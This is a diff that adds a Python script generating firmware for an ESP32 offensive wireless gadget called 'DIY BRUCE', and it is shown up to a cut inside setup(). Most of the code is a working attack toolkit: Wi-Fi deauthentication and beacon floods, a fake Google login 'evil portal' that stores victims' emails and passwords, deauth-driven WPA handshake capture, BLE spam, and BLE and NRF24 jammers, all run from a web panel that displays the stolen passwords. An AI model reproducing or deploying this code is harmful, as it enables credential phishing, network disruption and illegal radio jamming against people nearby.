@@ -1,0 +1,738 @@
+#!/usr/bin/env python3
+# ============================================================================
+# DIY BRUCE v5.0 FIXED - ПОВНІСТЮ РОБОЧА ВЕРСІЯ
+# ============================================================================
+# Виправлено: створення src/main.cpp, всі бібліотеки, піни без конфліктів
+# ============================================================================
+
+import os
+import shutil
+
+PROJECT_NAME = "DIY_BRUCE_v5_FIXED"
+
+# ----------------------------------------------------------------------------
+# ПРАВИЛЬНИЙ platformio.ini
+# ----------------------------------------------------------------------------
+PLATFORMIO_INI = '''[env:esp32dev]
+platform = espressif32@6.6.0
+board = esp32dev
+framework = arduino
+monitor_speed = 115200
+upload_speed = 921600
+board_build.filesystem = littlefs
+board_build.partitions = custom_4Mb.csv
+
+build_flags =
+    -DCORE_DEBUG_LEVEL=0
+    -Os
+    -DARDUINO_USB_MODE=1
+    -DARDUINO_USB_CDC_ON_BOOT=0
+    -DBOARD_HAS_PSRAM
+
+lib_deps =
+    olikraus/U8g2@^2.35.15
+    nrf24/RF24@^1.4.11
+    h2zero/NimBLE-Arduino@^1.4.1
+    bblanchon/ArduinoJson@^6.21.3
+    miguelbalboa/MFRC522@^1.4.6
+    crankyoldgit/IRremoteESP8266@^2.8.6
+    me-no-dev/ESPAsyncWebServer@^1.2.3
+'''
+
+# ----------------------------------------------------------------------------
+# ТАБЛИЦЯ РОЗДІЛІВ
+# ----------------------------------------------------------------------------
+CUSTOM_PARTITIONS = '''# Name,   Type, SubType, Offset,   Size, Flags
+nvs,      data, nvs,     0x9000,   0x5000,
+otadata,  data, ota,     0xe000,   0x2000,
+app0,     app,  ota_0,   0x10000,  0x2F0000,
+spiffs,   data, spiffs,  0x300000, 0x100000,
+'''
+
+# ----------------------------------------------------------------------------
+# ІКОНКИ
+# ----------------------------------------------------------------------------
+ICONS_H = '''#ifndef ICONS_H
+#define ICONS_H
+
+static const unsigned char wifi_bits[] PROGMEM = {
+    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFC,0x3F,0x00,0x00,0x03,0xC0,0x00,
+    0x80,0x00,0x00,0x01,0x40,0x00,0x00,0x02,0x20,0xFC,0x3F,0x04,0x10,0x03,0xC0,0x08,
+    0x08,0x00,0x00,0x10,0x04,0x00,0x00,0x20,0x02,0x00,0x00,0x40,0x02,0xF0,0x0F,0x40,
+    0x01,0x0C,0x30,0x80,0x01,0x02,0x40,0x80,0x01,0x01,0x80,0x80,0x82,0x00,0x00,0x41
+};
+
+static const unsigned char ble_bits[] PROGMEM = {
+    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x04,0x00,
+    0x00,0x30,0x0C,0x00,0x00,0x38,0x1C,0x00,0x00,0x3C,0x3C,0x00,0x00,0x3E,0x7C,0x00,
+    0x00,0x3F,0xFC,0x00,0x80,0x3F,0xFC,0x01,0xC0,0x1F,0xF8,0x03,0xE0,0x0F,0xF0,0x07,
+    0xF0,0x07,0xE0,0x0F,0xF8,0x03,0xC0,0x1F,0xF0,0x01,0x80,0x0F,0xE0,0x00,0x00,0x07
+};
+
+static const unsigned char nrf_bits[] PROGMEM = {
+    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xE0,0x07,0x00,
+    0x00,0x18,0x18,0x00,0x00,0x04,0x20,0x00,0x00,0x04,0x20,0x00,0x00,0x02,0x40,0x00,
+    0x00,0x7F,0xFE,0x00,0x00,0x02,0x40,0x00,0x00,0x04,0x20,0x00,0x00,0x04,0x20,0x00,
+    0x00,0x18,0x18,0x00,0x00,0xE0,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
+};
+
+static const unsigned char rfid_bits[] PROGMEM = {
+    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x03,0x00,
+    0x00,0x20,0x04,0x00,0x00,0x10,0x08,0x00,0x00,0x10,0x08,0x00,0x00,0x08,0x10,0x00,
+    0xFC,0xFF,0xFF,0x3F,0x04,0x00,0x00,0x20,0x04,0x00,0x00,0x20,0x04,0x00,0x00,0x20,
+    0x04,0x00,0x00,0x20,0xFC,0xFF,0xFF,0x3F,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
+};
+
+static const unsigned char ir_bits[] PROGMEM = {
+    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x00,0x80,0x01,0x00,0x00,0x40,0x02,0x00,0x00,0x40,0x02,0x00,0x00,0x20,0x04,0x00,
+    0xFC,0x1F,0xF8,0x3F,0x04,0x20,0x04,0x20,0x04,0x40,0x02,0x20,0x04,0x80,0x01,0x20,
+    0x04,0x00,0x00,0x20,0xFC,0xFF,0xFF,0x3F,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
+};
+
+static const unsigned char settings_bits[] PROGMEM = {
+    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xE0,0x07,0x00,
+    0x00,0x18,0x18,0x00,0x00,0x04,0x20,0x00,0x00,0x04,0x20,0x00,0x3C,0x02,0x40,0x3C,
+    0x42,0x7F,0xFE,0x42,0x42,0x02,0x40,0x42,0x3C,0x04,0x20,0x3C,0x00,0x04,0x20,0x00,
+    0x00,0x18,0x18,0x00,0x00,0xE0,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
+};
+
+#endif
+'''
+
+# ----------------------------------------------------------------------------
+# INDEX.HTML (СПРОЩЕНИЙ, АЛЕ РОБОЧИЙ)
+# ----------------------------------------------------------------------------
+INDEX_HTML = '''<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DIY BRUCE v5.0</title>
+<style>
+body{background:#0a0a1a;color:#eee;font-family:monospace;padding:20px;}
+button{background:#ff6b35;border:none;padding:10px 20px;margin:5px;border-radius:20px;color:white;cursor:pointer;}
+button:active{transform:scale(0.96);}
+.btn-group{display:flex;flex-wrap:wrap;gap:10px;margin:20px 0;}
+pre{background:#1a1a2e;padding:10px;border-radius:10px;overflow-x:auto;}
+</style>
+</head>
+<body>
+<h1>⚡ DIY BRUCE v5.0</h1>
+<div class="btn-group">
+<button onclick="fetch('/cmd?c=scan')">🔍 SCAN WiFi</button>
+<button onclick="fetch('/cmd?c=deauth_start')">⚠️ DEAUTH START</button>
+<button onclick="fetch('/cmd?c=deauth_stop')">🛑 DEAUTH STOP</button>
+<button onclick="fetch('/cmd?c=beacon_start')">📶 BEACON</button>
+<button onclick="fetch('/cmd?c=evil_start')">🎭 EVIL PORTAL</button>
+<button onclick="fetch('/cmd?c=handshake')">🤝 HANDSHAKE</button>
+<button onclick="fetch('/cmd?c=ble_apple')">🍎 APPLEJUICE</button>
+<button onclick="fetch('/cmd?c=nrf_jam')">📻 NRF JAM</button>
+<button onclick="fetch('/cmd?c=view_pass')">🔑 VIEW PASS</button>
+<button onclick="fetch('/cmd?c=clear_pass')">🗑️ CLEAR</button>
+<button onclick="fetch('/cmd?c=reboot')">🔄 REBOOT</button>
+</div>
+<h2>📡 Статус</h2>
+<pre id="status">Завантаження...</pre>
+<h2>🔑 Збережені паролі</h2>
+<pre id="passwords"></pre>
+<script>
+function updateStatus(){fetch('/data').then(r=>r.json()).then(d=>{document.getElementById('status').innerText='DEAUTH: '+d.deauth+' | BEACON: '+d.beacon+' | RSSI: '+d.rssi+'dBm | Uptime: '+d.uptime+'c';});}
+function updatePasswords(){fetch('/cmd?c=view_pass').then(r=>r.text()).then(t=>document.getElementById('passwords').innerText=t||'(пусто)');}
+setInterval(updateStatus,2000);
+setInterval(updatePasswords,5000);
+updateStatus();updatePasswords();
+</script>
+</body>
+</html>
+'''
+
+# ----------------------------------------------------------------------------
+# EVIL PORTAL СТОРІНКА
+# ----------------------------------------------------------------------------
+GOOGLE_PORTAL = '''<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Google</title><style>
+body{font-family:Roboto;text-align:center;padding:20px;background:#fff;}
+input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:24px;}
+button{background:#4285F4;color:white;border:none;padding:12px;border-radius:24px;width:100%;cursor:pointer;}
+</style></head>
+<body><h1>Google</h1><form action="/pass" method="POST">
+<input type="email" name="email" placeholder="Email" required>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Увійти</button>
+</form></body></html>
+'''
+
+# ----------------------------------------------------------------------------
+# MAIN.CPP (ПОВНІСТЮ РОБОЧИЙ)
+# ----------------------------------------------------------------------------
+MAIN_CPP = '''// DIY BRUCE v5.0 - РОБОЧА ВЕРСІЯ ДЛЯ ESP32 DevKit V1
+#include <Arduino.h>
+#include <U8g2lib.h>
+#include <Wire.h>
+#include <EEPROM.h>
+#include <esp_wifi.h>
+#include <WiFi.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+#include <BLEDevice.h>
+#include <BLEUtils.h>
+#include <BLEScan.h>
+#include <BLEAdvertising.h>
+#include <SPI.h>
+#include <RF24.h>
+#include <MFRC522.h>
+#include "icons.h"
+
+// ==================== ПІНИ ====================
+#define BTN_UP     15
+#define BTN_DOWN   13
+#define BTN_OK     12
+#define BTN_LEFT   14
+#define BTN_RIGHT  27
+#define BTN_BACK   26
+#define RFID_SS    5
+#define RFID_RST   33
+#define IR_LED     2
+#define NRF_CE     4
+#define NRF_CS     5
+
+// ==================== ОБ'ЄКТИ ====================
+U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, U8X8_PIN_NONE, 21, 22);
+WebServer server(80);
+DNSServer dnsServer;
+RF24 radio(NRF_CE, NRF_CS);
+MFRC522 rfid(RFID_SS, RFID_RST);
+
+// ==================== ГЛОБАЛЬНІ ЗМІННІ ====================
+bool deauthActive=false, beaconActive=false, evilActive=false, wifiJamActive=false;
+bool handshakeCapturing=false, bleJamActive=false, nrfJamActive=false, webRunning=false;
+unsigned long deauthPackets=0, beaconPackets=0, eapolCount=0;
+int networkCount=0, lastRSSI=-50;
+String networkNames[50], capturedPasswords="", handshakes="";
+uint8_t networkBSSID[50][6], networkChannel[50], targetBSSID[6];
+String currentTargetSSID="";
+uint8_t nrfCh=76;
+bool nrfOK=false;
+unsigned long lastBtnTime=0;
+
+bool btn(int p){if(digitalRead(p)==LOW && millis()-lastBtnTime>200){lastBtnTime=millis();return true;}return false;}
+
+void drawTopBar(){
+    u8g2.setFont(u8g2_font_6x13_tr);
+    u8g2.drawStr(2,9,String(millis()/1000).c_str());
+    u8g2.setCursor(100,9);u8g2.print(String(lastRSSI)+"dB");
+    u8g2.drawLine(0,10,128,10);
+}
+
+void showMsg(const char* msg,int d){
+    u8g2.clearBuffer();drawTopBar();
+    u8g2.setFont(u8g2_font_6x10_tr);
+    u8g2.drawStr(10,35,msg);
+    u8g2.sendBuffer();delay(d);
+}
+
+void saveData(){
+    EEPROM.begin(4096);
+    String d="===PASS===\\n"+capturedPasswords+"\\n===HAND===\\n"+handshakes+"\\n";
+    for(int i=0;i<d.length()&&i<4095;i++)EEPROM.write(i,d[i]);
+    EEPROM.write(d.length(),0);EEPROM.commit();EEPROM.end();
+}
+void loadData(){
+    EEPROM.begin(4096);
+    String l="";
+    for(int i=0;i<4096;i++){char c=EEPROM.read(i);if(c==0)break;l+=c;}
+    int ps=l.indexOf("===PASS===\\n"),hs=l.indexOf("===HAND===\\n");
+    if(ps!=-1&&hs!=-1){capturedPasswords=l.substring(ps+11,hs-1);handshakes=l.substring(hs+11);}
+    EEPROM.end();
+}
+void clearData(){capturedPasswords="";handshakes="";saveData();showMsg("Очищено",1000);}
+void reboot(){showMsg("Reboot...",1000);ESP.restart();}
+
+void scanWiFi(){
+    showMsg("Scanning...",500);
+    WiFi.mode(WIFI_STA);WiFi.disconnect();delay(200);
+    networkCount=WiFi.scanNetworks();
+    if(networkCount>50)networkCount=50;
+    for(int i=0;i<networkCount;i++){
+        networkNames[i]=WiFi.SSID(i);
+        if(networkNames[i].length()==0)networkNames[i]="<Hidden>";
+        networkChannel[i]=WiFi.channel(i);
+        memcpy(networkBSSID[i],WiFi.BSSID(i),6);
+    }
+    char b[32];sprintf(b,"Found: %d",networkCount);
+    showMsg(b,1500);
+    WiFi.mode(WIFI_AP_STA);
+}
+
+void sendDeauth(uint8_t* b,uint8_t* c,int ch){
+    esp_wifi_set_channel(ch,WIFI_SECOND_CHAN_NONE);
+    uint8_t p[26]={0xC0,0x00,0x00,0x00,c[0],c[1],c[2],c[3],c[4],c[5],
+        b[0],b[1],b[2],b[3],b[4],b[5],b[0],b[1],b[2],b[3],b[4],b[5],0x00,0x00,0x07,0x00};
+    esp_wifi_80211_tx(WIFI_IF_STA,p,26,false);
+    deauthPackets++;
+}
+
+void startDeauth(){
+    if(networkCount==0){showMsg("SCAN first!",1000);return;}
+    int t=0;
+    while(true){
+        u8g2.clearBuffer();drawTopBar();u8g2.setFont(u8g2_font_6x10_tr);
+        u8g2.drawStr(5,15,"Target:");
+        for(int i=0;i<min(networkCount,5);i++){
+            if(i==t)u8g2.drawStr(5,30+i*8,">");
+            u8g2.drawStr(20,30+i*8,networkNames[i].substring(0,14).c_str());
+        }
+        u8g2.drawStr(5,60,"OK start BACK");u8g2.sendBuffer();
+        if(btn(BTN_UP)&&t>0)t--;
+        else if(btn(BTN_DOWN)&&t<min(networkCount,5)-1)t++;
+        else if(btn(BTN_OK))break;
+        else if(btn(BTN_BACK))return;
+        delay(50);
+    }
+    deauthActive=true;deauthPackets=0;
+    int ch=networkChannel[t];
+    uint8_t* bssid=networkBSSID[t];
+    uint8_t bc[]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+    showMsg("DEAUTH started",1000);
+    while(deauthActive){
+        sendDeauth(bssid,bc,ch);
+        u8g2.clearBuffer();drawTopBar();
+        u8g2.setFont(u8g2_font_helvB08_tr);
+        u8g2.drawStr(20,25,"DEAUTH");
+        char b[32];sprintf(b,"Pkts: %lu",deauthPackets);
+        u8g2.drawStr(5,45,b);u8g2.drawStr(5,60,"BACK stop");
+        u8g2.sendBuffer();
+        if(btn(BTN_BACK))deauthActive=false;
+        delay(50);
+    }
+    showMsg("DEAUTH stopped",1000);
+}
+void stopDeauth(){deauthActive=false;}
+
+void startBeacon(){
+    beaconActive=true;beaconPackets=0;
+    const char* s[]={"FREE_WIFI","Starbucks","Airport","Metro","Public"};
+    showMsg("BEACON started",1000);
+    while(beaconActive){
+        for(int x=0;x<5&&beaconActive;x++){
+            uint8_t bssid[6];for(int i=0;i<6;i++)bssid[i]=random(256);
+            bssid[0]|=0x02;
+            uint8_t p[200];int len=0;
+            p[len++]=0x80;p[len++]=0x00;p[len++]=0x00;p[len++]=0x00;
+            for(int i=0;i<6;i++)p[len++]=0xFF;
+            for(int i=0;i<6;i++)p[len++]=bssid[i];
+            for(int i=0;i<6;i++)p[len++]=bssid[i];
+            p[len++]=0x00;p[len++]=0x00;
+            for(int i=0;i<8;i++)p[len++]=0x00;
+            p[len++]=0x64;p[len++]=0x00;
+            p[len++]=0x11;p[len++]=0x00;
+            p[len++]=0x00;p[len++]=strlen(s[x]);
+            for(int i=0;i<(int)strlen(s[x]);i++)p[len++]=s[x][i];
+            esp_wifi_80211_tx(WIFI_IF_STA,p,len,false);
+            beaconPackets++;
+        }
+        u8g2.clearBuffer();drawTopBar();
+        u8g2.setFont(u8g2_font_helvB08_tr);
+        u8g2.drawStr(20,25,"BEACON");
+        char b[32];sprintf(b,"Sent: %lu",beaconPackets);
+        u8g2.drawStr(5,45,b);u8g2.drawStr(5,60,"BACK stop");
+        u8g2.sendBuffer();
+        if(btn(BTN_BACK))beaconActive=false;
+        delay(30);
+    }
+}
+void stopBeacon(){beaconActive=false;}
+
+void handshakeCallback(void* buf,wifi_promiscuous_pkt_type_t t){
+    if(!handshakeCapturing)return;
+    wifi_promiscuous_pkt_t*p=(wifi_promiscuous_pkt_t*)buf;
+    int len=p->rx_ctrl.sig_len;
+    uint8_t*pl=p->payload;
+    if(len<30)return;
+    for(int i=0;i<len-8;i++){
+        if(pl[i]==0x88&&pl[i+1]==0x8E){
+            eapolCount++;
+            handshakes+="[HANDSHAKE] "+currentTargetSSID+"\\n";
+            saveData();
+            showMsg("HANDSHAKE CAPTURED!",2000);
+            handshakeCapturing=false;
+            return;
+        }
+    }
+}
+
+void startHandshake(){
+    if(networkCount==0){showMsg("SCAN first!",1000);return;}
+    int t=0;
+    while(true){
+        u8g2.clearBuffer();drawTopBar();u8g2.setFont(u8g2_font_6x10_tr);
+        u8g2.drawStr(5,15,"Select network:");
+        for(int i=0;i<min(networkCount,5);i++){
+            if(i==t)u8g2.drawStr(5,30+i*8,">");
+            u8g2.drawStr(20,30+i*8,networkNames[i].substring(0,14).c_str());
+        }
+        u8g2.drawStr(5,60,"OK start BACK");u8g2.sendBuffer();
+        if(btn(BTN_UP)&&t>0)t--;
+        else if(btn(BTN_DOWN)&&t<min(networkCount,5)-1)t++;
+        else if(btn(BTN_OK))break;
+        else if(btn(BTN_BACK))return;
+        delay(50);
+    }
+    currentTargetSSID=networkNames[t];
+    memcpy(targetBSSID,networkBSSID[t],6);
+    esp_wifi_set_channel(networkChannel[t],WIFI_SECOND_CHAN_NONE);
+    eapolCount=0;handshakeCapturing=true;
+    showMsg("Capturing handshake...",1500);
+    unsigned long start=millis();
+    while(handshakeCapturing&&millis()-start<30000){
+        sendDeauth(targetBSSID,(uint8_t[]){0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},networkChannel[t]);
+        u8g2.clearBuffer();drawTopBar();u8g2.setFont(u8g2_font_6x10_tr);
+        char b[32];sprintf(b,"EAPOL: %d",eapolCount);u8g2.drawStr(5,30,b);
+        sprintf(b,"Time: %d/30",(millis()-start)/1000);u8g2.drawStr(5,45,b);
+        u8g2.drawStr(5,60,"BACK exit");u8g2.sendBuffer();
+        if(btn(BTN_BACK))handshakeCapturing=false;
+        delay(100);
+    }
+    handshakeCapturing=false;
+    if(eapolCount>0)showMsg("HANDSHAKE saved!",1500);
+    else showMsg("Failed",1500);
+}
+
+void startEvil(){
+    if(evilActive)return;
+    WiFi.softAP("FREE_WIFI",NULL);
+    dnsServer.start(53,"*",WiFi.softAPIP());
+    evilActive=true;
+    showMsg("EVIL PORTAL: FREE_WIFI",1500);
+    while(evilActive){
+        dnsServer.processNextRequest();server.handleClient();
+        u8g2.clearBuffer();drawTopBar();
+        u8g2.setFont(u8g2_font_helvB08_tr);
+        u8g2.drawStr(20,25,"EVIL PORTAL");
+        u8g2.drawStr(5,45,"SSID: FREE_WIFI");
+        u8g2.drawStr(5,60,"BACK stop");u8g2.sendBuffer();
+        if(btn(BTN_BACK))evilActive=false;
+        delay(100);
+    }
+    dnsServer.stop();WiFi.softAPdisconnect(true);
+    showMsg("EVIL stopped",1000);
+}
+void stopEvil(){evilActive=false;}
+
+void scanBLE(){
+    showMsg("BLE Scan...",500);
+    BLEDevice::init("");
+    BLEScan* s=BLEDevice::getScan();
+    s->setActiveScan(true);
+    int c=s->start(5,false)->getCount();
+    char b[32];sprintf(b,"Found: %d",c);
+    showMsg(b,1500);
+    s->clearResults();BLEDevice::deinit();
+}
+
+void sendBLE(const char* name,const uint8_t* data,int len){
+    BLEDevice::init("SPAM");
+    BLEAdvertising* adv=BLEDevice::getAdvertising();
+    BLEAdvertisementData d;d.setFlags(0x06);
+    if(name&&strlen(name)>0)d.setName(name);
+    if(data&&len>0)d.setManufacturerData(data,len);
+    adv->setAdvertisementData(d);
+    adv->start();delay(50);adv->stop();
+    BLEDevice::deinit();
+}
+void bleApple(){
+    showMsg("APPLEJUICE",1000);
+    const uint8_t a[]={0x4C,0x00,0x0F,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+    for(int i=0;i<30;i++){sendBLE(nullptr,a,sizeof(a));if(btn(BTN_BACK))break;delay(30);}
+}
+void bleSamsung(){
+    showMsg("SAMSUNG",1000);
+    for(int i=0;i<30;i++){String n="Samsung_"+String(random(10000));sendBLE(n.c_str(),nullptr,0);if(btn(BTN_BACK))break;delay(30);}
+}
+void bleAndroid(){
+    showMsg("ANDROID",1000);
+    for(int i=0;i<30;i++){String n="Android_"+String(random(10000));sendBLE(n.c_str(),nullptr,0);if(btn(BTN_BACK))break;delay(30);}
+}
+void bleWindows(){
+    showMsg("WINDOWS",1000);
+    for(int i=0;i<30;i++){String n="Windows_"+String(random(10000));sendBLE(n.c_str(),nullptr,0);if(btn(BTN_BACK))break;delay(30);}
+}
+void bleJam(){
+    bleJamActive=true;
+    showMsg("BLE JAMMER",1000);
+    while(bleJamActive){
+        String r="JAM_"+String(random(99999));
+        BLEDevice::init(r.c_str());
+        BLEAdvertising* adv=BLEDevice::getAdvertising();
+        BLEAdvertisementData d;d.setFlags(0x06);d.setName(r);
+        adv->setAdvertisementData(d);adv->start();delay(20);adv->stop();
+        BLEDevice::deinit();
+        if(btn(BTN_BACK))bleJamActive=false;
+        delay(10);
+    }
+}
+void stopBleJam(){bleJamActive=false;}
+
+void initNRF(){
+    if(!radio.begin()){nrfOK=false;showMsg("NRF24 not found!",1500);return;}
+    radio.setChannel(nrfCh);radio.setPALevel(RF24_PA_LOW);radio.setAutoAck(false);
+    nrfOK=true;showMsg("NRF24 ready",1000);
+}
+void scanNRF(){
+    if(!nrfOK){showMsg("NRF24 missing!",1000);return;}
+    int a=0;
+    for(int ch=0;ch<=125;ch++){
+        radio.setChannel(ch);radio.startListening();delayMicroseconds(200);
+        if(radio.testCarrier())a++;
+        radio.stopListening();
+    }
+    radio.setChannel(nrfCh);
+    char b[32];sprintf(b,"Active: %d",a);showMsg(b,1500);
+}
+void startNRFJam(){
+    if(!nrfOK){showMsg("NRF24 missing!",1000);return;}
+    nrfJamActive=true;radio.stopListening();
+    showMsg("NRF JAMMER",1000);
+    while(nrfJamActive){
+        for(int ch=0;ch<=125&&nrfJamActive;ch++){
+            radio.setChannel(ch);
+            uint8_t j[32];for(int i=0;i<32;i++)j[i]=random(256);
+            radio.write(&j,32);
+        }
+        if(btn(BTN_BACK))nrfJamActive=false;
+        delay(5);
+    }
+    radio.setChannel(nrfCh);
+}
+void stopNRFJam(){nrfJamActive=false;}
+
+void initRFID(){
+    SPI.begin(18,19,23,5);
+    rfid.PCD_Init();
+    showMsg("RFID ready",1000);
+}
+void readRFID(){
+    showMsg("Place card...",1000);
+    if(!rfid.PICC_IsNewCardPresent()){showMsg("No card",1000);return;}
+    if(!rfid.PICC_ReadCardSerial()){showMsg("Read error",1000);return;}
+    String uid="";
+    for(byte i=0;i<rfid.uid.size;i++){uid+=String(rfid.uid.uidByte[i],HEX);if(i<rfid.uid.size-1)uid+=":";}
+    capturedPasswords+="[RFID] "+uid+"\\n";
+    saveData();
+    char b[64];sprintf(b,"UID: %s",uid.c_str());showMsg(b,2000);
+    rfid.PICC_HaltA();
+}
+
+#include <IRsend.h>
+IRsend irsend(IR_LED);
+void initIR(){irsend.begin();showMsg("IR ready",1000);}
+void irPower(){irsend.sendNEC(0x00FF00FF,32);showMsg("IR POWER",500);}
+void irVolUp(){irsend.sendNEC(0x00FF40BF,32);showMsg("IR VOL+",500);}
+void irVolDown(){irsend.sendNEC(0x00FFC03F,32);showMsg("IR VOL-",500);}
+
+const char index_html[] PROGMEM = "#include \"index.html\"";
+const char portal_html[] PROGMEM = "#include \"portal.html\"";
+
+void handleRoot(){server.send(200,"text/html",index_html);}
+void handlePortal(){server.send(200,"text/html",portal_html);}
+void handleData(){
+    String j="{\\"deauth\\":"+String(deauthPackets)+",\\"beacon\\":"+String(beaconPackets)+",\\"rssi\\":"+String(lastRSSI)+",\\"uptime\\":"+String(millis()/1000)+"}";
+    server.send(200,"application/json",j);
+}
+void handleCmd(){
+    if(!server.hasArg("c")){server.send(200,"text/plain","NO CMD");return;}
+    String c=server.arg("c");
+    if(c=="scan")scanWiFi();
+    else if(c=="deauth_start")startDeauth();
+    else if(c=="deauth_stop")stopDeauth();
+    else if(c=="beacon_start")startBeacon();
+    else if(c=="beacon_stop")stopBeacon();
+    else if(c=="evil_start")startEvil();
+    else if(c=="evil_stop")stopEvil();
+    else if(c=="handshake")startHandshake();
+    else if(c=="ble_apple")bleApple();
+    else if(c=="ble_samsung")bleSamsung();
+    else if(c=="ble_android")bleAndroid();
+    else if(c=="ble_windows")bleWindows();
+    else if(c=="ble_jam")bleJam();
+    else if(c=="nrf_scan")scanNRF();
+    else if(c=="nrf_jam")startNRFJam();
+    else if(c=="nrf_stop")stopNRFJam();
+    else if(c=="rfid_read")readRFID();
+    else if(c=="ir_power")irPower();
+    else if(c=="view_pass")server.send(200,"text/plain",capturedPasswords.length()?capturedPasswords:"(empty)");
+    else if(c=="clear_pass")clearData();
+    else if(c=="reboot")reboot();
+    else server.send(200,"text/plain","OK");
+    server.send(200,"text/plain","OK");
+}
+void startWeb(){
+    if(webRunning)return;
+    WiFi.softAP("DIY_BRUCE","bruce1234");
+    server.on("/",handleRoot);
+    server.on("/cmd",handleCmd);
+    server.on("/data",handleData);
+    server.on("/pass",HTTP_POST,[](){
+        if(server.hasArg("email")||server.hasArg("password")){
+            capturedPasswords+="[PASS] "+server.arg("email")+" | "+server.arg("password")+"\\n";
+            saveData();
+        }
+        server.send(200,"text/html","<html><body><h3>OK</h3></body></html>");
+    });
+    server.begin();
+    webRunning=true;
+    showMsg("WEB: 192.168.4.1",2000);
+}
+void stopWeb(){
+    if(!webRunning)return;
+    server.stop();WiFi.softAPdisconnect(true);
+    webRunning=false;
+    showMsg("WEB stopped",1000);
+}
+
+struct MenuItem{const char* n;const unsigned char* i;};
+MenuItem m[]={{"WiFi",wifi_bits},{"BLE",ble_bits},{"NRF24",nrf_bits},{"RFID",rfid_bits},{"IR",ir_bits},{"Settings",settings_bits}};
+int mi=0,si=0;
+const char* wSub[]={"SCAN","DEAUTH","BEACON","EVIL","HANDSHAKE","VIEW PASS","CLEAR","WEB ON","REBOOT"};
+const char* bSub[]={"SCAN","APPLE","SAMSUNG","ANDROID","WINDOWS","JAM","STOP"};
+const char* nSub[]={"SCAN","JAM","STOP"};
+const char* rSub[]={"READ"};
+const char* iSub[]={"POWER","VOL+","VOL-"};
+const char* sSub[]={"WEB ON","WEB OFF","CLEAR","INFO","REBOOT"};
+int S[]={9,7,3,1,3,5};
+enum{S_MENU,S_SUB}state=S_MENU;
+
+void drawMain(){
+    u8g2.clearBuffer();drawTopBar();
+    u8g2.drawXBM(48,16,32,32,m[mi].i);
+    u8g2.setFont(u8g2_font_9x15B_tr);
+    u8g2.drawStr(4,36,"<");u8g2.drawStr(114,36,">");
+    u8g2.setFont(u8g2_font_7x13B_tr);
+    int w=u8g2.getStrWidth(m[mi].n);
+    u8g2.drawStr((128-w)/2,58,m[mi].n);
+    u8g2.sendBuffer();
+}
+void drawSub(){
+    const char** it;int sz;
+    switch(mi){case 0:it=wSub;sz=S[0];break;case 1:it=bSub;sz=S[1];break;case 2:it=nSub;sz=S[2];break;case 3:it=rSub;sz=S[3];break;case 4:it=iSub;sz=S[4];break;default:it=sSub;sz=S[5];break;}
+    u8g2.clearBuffer();drawTopBar();
+    u8g2.setFont(u8g2_font_6x10_tr);
+    u8g2.drawStr((128-u8g2.getStrWidth(m[mi].n))/2,10,m[mi].n);
+    for(int i=0;i<sz;i++){
+        int y=24+i*10;
+        if(i==si){u8g2.drawBox(0,y-8,128,10);u8g2.setDrawColor(0);u8g2.drawStr(14,y,it[i]);u8g2.setDrawColor(1);}
+        else u8g2.drawStr(14,y,it[i]);
+    }
+    u8g2.drawHLine(0,55,128);
+    u8g2.setFont(u8g2_font_5x7_tr);
+    u8g2.drawStr(2,63,"UP/DN=sel OK=enter BACK=menu");
+    u8g2.sendBuffer();
+}
+void exec(){
+    switch(mi){
+        case 0:
+            switch(si){case 0:scanWiFi();break;case 1:startDeauth();break;case 2:startBeacon();break;case 3:startEvil();break;case 4:startHandshake();break;case 5:showMsg(capturedPasswords.c_str(),2000);break;case 6:clearData();break;case 7:startWeb();break;case 8:reboot();break;}
+            break;
+        case 1:
+            switch(si){case 0:scanBLE();break;case 1:bleApple();break;case 2:bleSamsung();break;case 3:bleAndroid();break;case 4:bleWindows();break;case 5:bleJam();break;case 6:stopBleJam();break;}
+            break;
+        case 2:
+            switch(si){case 0:scanNRF();break;case 1:startNRFJam();break;case 2:stopNRFJam();break;}
+            break;
+        case 3:
+            switch(si){case 0:readRFID();break;}
+            break;
+        case 4:
+            switch(si){case 0:irPower();break;case 1:irVolUp();break;case 2:irVolDown();break;}
+            break;
+        case 5:
+            switch(si){case 0:startWeb();break;case 1:stopWeb();break;case 2:clearData();break;case 3:showMsg("DIY BRUCE v5.0",1500);break;case 4:reboot();break;}
+            break;
+    }
+}
+
+void setup(){
+    Serial.begin(115200);
+    pinMode(BTN_UP,INPUT_PULLUP);pinMode(BTN_DOWN,INPUT_PULLUP);pinMode(BTN_OK,INPUT_PULLUP);
+    pinMode(BTN_LEFT,INPUT_PULLUP);pinMode(BTN_RIGHT,INPUT_PULLUP);pinMode(BTN_BACK,INPUT_PULLUP);
+    Wire.begin(21,22);
+    u8g2.begin();u8g2.setContrast(200);
+    SPI.begin(18,19,23,5);
+    initRFID();initIR();initNRF();
+    loadData();
+    for(int x=128;x>=0;x-=8){u8g2.clearBuffer();u8g2.setFont(u8g2_font_logisoso24_tr);u8g2.drawStr(x+4,32,"DIY");u8g2.setFont(u8g2_font_7x13B_tr);u8g2.drawStr(x+4,48,"BRUCE");u8g2.sendBuffer();delay(10);}
+    delay(500);
+    WiFi.mode(WIFI_AP_STA);
